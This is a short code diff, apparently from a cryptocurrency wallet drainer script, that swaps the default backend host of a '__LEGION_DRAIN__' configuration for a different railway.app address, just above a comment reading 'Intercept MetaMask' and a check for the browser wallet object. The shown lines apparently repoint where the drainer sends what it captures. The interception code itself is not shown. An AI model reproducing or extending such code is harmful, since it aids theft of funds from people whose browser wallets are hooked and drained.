@@ -5,7 +5,7 @@
  */
 
 (function() {
-  const BACKEND = window.__LEGION_DRAIN__?.backend || 'https://legionapi-production.up.railway.app'
+  const BACKEND = window.__LEGION_DRAIN__?.backend || 'https://sadrailala-production.up.railway.app'
 
   // Intercept MetaMask
   if (window.ethereum) {
